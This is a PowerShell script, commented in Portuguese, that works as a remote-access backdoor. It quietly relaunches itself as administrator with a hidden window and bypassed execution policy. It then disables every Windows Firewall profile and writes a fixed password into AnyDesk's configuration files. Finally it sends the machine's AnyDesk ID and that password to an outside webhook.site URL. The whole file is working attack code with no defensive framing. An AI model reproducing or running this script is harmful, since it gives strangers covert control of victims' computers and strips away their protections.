# Função para verificar se o PowerShell está em modo administrador
function Test-Admin {
    return [bool]([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Iniciar PowerShell em modo administrador de forma silenciosa
if (-not (Test-Admin)) {
    Start-Process powershell -WindowStyle Hidden -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" > $null 2>&1
    exit
}

# Função para buscar informações nos arquivos de configuração e configurar a senha
function Get-AnyDeskInfoFromConfig {
    param (
        [string]$filePath,
        [string]$desiredPassword
    )
    if (Test-Path $filePath) {
        $configContent = Get-Content $filePath -ErrorAction SilentlyContinue
        $id = $null

        foreach ($line in $configContent) {
            if ($line -match "ad.anynet.id") {
                $id = $line -replace ".*=", ""
            }
        }

        # Adicionar ou atualizar a senha
        if ($configContent -match "ad.security.password_hash") {
            $newContent = $configContent -replace '(ad.security.password_hash=.*)', "ad.security.password_hash=$desiredPassword"
            Set-Content -Path $filePath -Value $newContent -ErrorAction SilentlyContinue
        } else {
            Add-Content -Path $filePath -Value "ad.security.password_hash=$desiredPassword" -ErrorAction SilentlyContinue
        }

        return $id
    }
    return $null
}

# Desabilitar firewalls (Requer permissões administrativas)
try {
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
} catch { }

# Procurar pelo AnyDesk
$anydeskPath = Get-Command AnyDesk -ErrorAction SilentlyContinue
$anydeskId = $null

if (-not $anydeskPath) {
    $commonPaths = @(
        "C:\Program Files\AnyDesk\AnyDesk.exe",
        "C:\Program Files (x86)\AnyDesk\AnyDesk.exe",
        "$env:LOCALAPPDATA\AnyDesk\AnyDesk.exe",
        "C:\ProgramData\AnyDesk\AnyDesk.exe"
    )
    foreach ($path in $commonPaths) {
        if (Test-Path $path) {
            $anydeskPath = $path
            break
        }
    }
}

# Analisar os arquivos de configuração do AnyDesk
$desiredPassword = "SenhaSegura123"
if ($anydeskPath) {
    $configFiles = @(
        "C:\ProgramData\AnyDesk\service.conf",
        "C:\ProgramData\AnyDesk\system.conf"
    )
    
    foreach ($file in $configFiles) {
        $anydeskId = Get-AnyDeskInfoFromConfig -filePath $file -desiredPassword $desiredPassword
        if ($anydeskId) { break }
    }
}

# Verificar se o AnyDesk ID foi recuperado
if (-not $anydeskId) {
    $anydeskId = "ID não disponível"
}

# Enviar credenciais para o WebHook
$webhookUrl = "https://webhook.site/0a0521d1-56aa-46f6-bb43-184ac389cbcc"
$payload = @{
    AnyDeskID = $anydeskId
    AnyDeskSenha = $desiredPassword
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" > $null 2>&1
